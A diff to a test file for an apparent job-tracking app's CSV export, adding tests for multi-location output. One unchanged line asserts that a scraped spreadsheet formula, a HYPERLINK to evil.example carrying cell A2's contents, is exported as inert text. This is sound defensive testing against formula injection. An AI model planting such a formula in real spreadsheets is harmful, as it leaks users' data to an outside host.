@@ -21,7 +21,7 @@ beforeEach(() => { fetchRoleRows.mockReset(); });
 const firstSeenAt = new Date("2026-09-01T00:00:00Z");
 const row = (title: string, location: string) => ({
   company: { name: "Acme Robotics", homepageUrl: "https://acme.example/" },
-  job: { title, location, url: "https://job-boards.greenhouse.io/acme/jobs/1", status: "open", fitScore: 80, firstSeenAt, postedAt: null, closedAt: null, inTable: true, archivedAt: null },
+  job: { title, location, locations: [location], url: "https://job-boards.greenhouse.io/acme/jobs/1", status: "open", fitScore: 80, firstSeenAt, postedAt: null, closedAt: null, inTable: true, archivedAt: null },
   decision: null,
   stage: "matched",
 });
@@ -37,6 +37,22 @@ it("is private and never cached, and writes scraped formulas as text", async () 
   expect(line).toContain(`"'=HYPERLINK(""https://evil.example/?""&A2,""Apply"")",'@London,`);
   // Every read was scoped to the signed-in account.
   expect(fetchRoleRows.mock.calls.every(([userId]) => userId === USER_ID)).toBe(true);
+});
+
+it("exports every resolved location, including a city beyond the primary one", async () => {
+  const multiLocation = row("Workday consultant", "USA, GA, Atlanta");
+  multiLocation.job.locations = ["USA, GA, Atlanta", "USA, VA, Reston", "USA, MA, Boston"];
+  fetchRoleRows.mockResolvedValueOnce([multiLocation]).mockResolvedValue([]);
+  const text = await (await GET(new NextRequest("https://ava.test/api/export.csv?location=Boston"))).text();
+  expect(text).toContain('"USA, GA, Atlanta; USA, VA, Reston; USA, MA, Boston"');
+});
+
+it("keeps the primary location when no resolved list is available", async () => {
+  const primaryOnly = row("Operations manager", "London");
+  primaryOnly.job.locations = [];
+  fetchRoleRows.mockResolvedValueOnce([primaryOnly]).mockResolvedValue([]);
+  const text = await (await GET(new NextRequest("https://ava.test/api/export.csv"))).text();
+  expect(text).toContain("Operations manager,London,");
 });
 
 /** A block of rows as fetchRoleRows returns them, each carrying the cursor that ends it. */
